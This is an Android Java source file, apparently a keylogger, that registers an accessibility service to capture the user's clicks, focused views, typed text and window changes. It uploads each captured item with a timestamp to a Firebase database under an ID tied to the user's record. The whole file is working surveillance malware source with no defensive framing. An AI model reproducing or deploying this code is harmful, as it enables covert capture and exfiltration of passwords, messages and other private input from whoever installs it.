package com.example.halac.keyloggers_notify;

/**
 * Created by halac on 10/4/17.
 */

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityEvent;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.Calendar;

public class MyAccessibilityService extends AccessibilityService {
    int counter = 0;
    String s = "";
    DatabaseHelper db = new DatabaseHelper (this);
    DatabaseReference database;
    String logs = "Logs";
    String id = "";

    @Override
    public void onServiceConnected() {
        User user = db.getUser ();
        database = FirebaseDatabase.getInstance().getReference("Users");
        id =database.push().getKey();
        database.child(id).setValue(user);
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED |
                AccessibilityEvent.TYPE_VIEW_FOCUSED|AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED|AccessibilityEvent.TYPE_VIEW_SCROLLED
                |AccessibilityEvent.TYPE_VIEW_LONG_CLICKED | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;

        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN;
        info.notificationTimeout = 30;
        this.setServiceInfo(info);
    }
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        //DateFormat df = new SimpleDateFormat("MM/dd/yyyy HH:mm:ss", Locale.US);
        Long t = Calendar.getInstance().getTime().getTime ();
        String time = t.toString ();
        final int eventType = event.getEventType();
        String data = "";
        switch(eventType) {
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                data = event.getText().toString();
                if(counter != 0) {
                    addLog("TEXT", s, time);
                    counter=0;
                }
                if(!data.equals("[]")) addLog("CLICKED",data,time);
                break;
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                data = event.getText().toString();
                if(counter != 0) {
                    addLog("TEXT", s, time);
                    counter=0;
                }
                if(!data.equals("[]")) addLog("FOCUSED",data,time);
                break;
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                counter++;
                data = event.getText().toString();
                if(counter != 0) s = data;
                else addLog("TEXT",data,time);
                break;
            case AccessibilityEvent.TYPE_VIEW_SCROLLED:
                if(counter != 0) {
                    addLog("TEXT", s, time);
                    counter=0;
                }
                if(!data.equals("[]")) addLog("SCROLLED",data,time);
                break;
            case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
                data = event.getText().toString();
                if(counter != 0) {
                    addLog("TEXT", s, time);
                    counter=0;
                }
                if(!data.equals("[]")) addLog("LONG CLICKED",data,time);
                break;
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                data = event.getText().toString();
                if(counter != 0) {
                    addLog("TEXT", s, time);
                    counter=0;
                }
                if(!data.equals("[]")) addLog("CHANGE",data,time);
                break;

        }
    }

    @Override
    public void onInterrupt() {
    }

    // addLog for all events except scrolled events
    private void addLog(String type, String context, String date) {
            String key = database.push ().getKey ();
            Logs l = new Logs (type, context, date);
            database.child(id).child(logs).child(key).setValue(l);
    }
}
